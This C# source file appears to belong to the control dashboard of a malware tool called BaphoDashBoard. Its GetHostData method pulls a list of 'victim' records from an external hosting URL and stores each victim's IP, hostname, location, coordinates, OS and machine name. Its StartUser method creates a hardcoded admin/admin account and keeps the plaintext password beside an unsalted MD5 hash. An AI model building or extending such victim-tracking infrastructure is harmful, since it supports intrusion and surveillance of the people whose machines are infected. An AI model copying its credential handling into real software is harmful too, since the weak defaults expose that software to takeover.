using BaphoDashBoard.DTO;
using BaphoDashBoard.Models;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace BaphoDashBoard.DAL.Services
{
    public class BaseService
    {
        protected readonly MyLocalDatabase _context;
        public BaseService(MyLocalDatabase context)
        {
            _context = context;
        }

        public async Task<AppResult> GetHostData()
        {
            AppResult result = new AppResult();
            try
            {
                WebRequest request = WebRequest.Create("https://baphomettest.000webhostapp.com/data.txt");
                WebResponse response = request.GetResponse();
                Stream data = response.GetResponseStream();
                string content = String.Empty;
                using (StreamReader sr = new StreamReader(data))
                {
                    content = sr.ReadToEnd();
                    var contentObj = JsonConvert.DeserializeObject<List<VictimDetailsDTO>>(content);
                    if (contentObj != null)
                    {
                        foreach (var victimInfo in contentObj)
                        {
                            string[] Ubication = victimInfo.Localitation.Split(",");
                            VictimDetail victim = new VictimDetail()
                            {
                                Ip = victimInfo.Ip,
                                Hostname = victimInfo.Hostname,
                                City = victimInfo.City,
                                Region = victimInfo.Region,
                                Country = victimInfo.Country,
                                Lat = Ubication[0],
                                Lng = Ubication[1],
                                PostalCode = victimInfo.PostalCode,
                                MachineOS = victimInfo.MachineOs,
                                MachinName = victimInfo.MachineName

                            };
                            _context.VictimDetail.Add(victim);
                            _context.SaveChanges();

                            result.success = true;
                            result.message = "Updated Data";
                        }
                    }
                    else
                    {
                        result.success = false;
                        result.message = "No new data found";
                    }
                }
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult<VictimDetail>> GetVictimData()
        {
            AppResult<VictimDetail> result = new AppResult<VictimDetail>();
            try
            {

            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public AppResult StartUser()
        {
            AppResult result = new AppResult();
            try
            {
                var hash = "";
                using (MD5 mD5 = MD5.Create())
                {
                    hash = GetMd5Hash(mD5, "admin");
                }

                var admin = new Administrators()
                {
                    Username = "admin",
                    Password = "admin",
                    PasswordHash = hash
                };
                _context.Administrators.Add(admin);
                _context.SaveChanges();

                result.success = true;
                result.message = "Your administrator account has been created successfully";
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }

            return result;
        }

        static string GetMd5Hash(MD5 md5Hash, string input)
        {
            // Convert the input string to a byte array and compute the hash.
            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

            // Create a new Stringbuilder to collect the bytes
            // and create a string.
            StringBuilder sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data 
            // and format each one as a hexadecimal string.
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }
            // Return the hexadecimal string.
            return sBuilder.ToString();
        }
    }
}
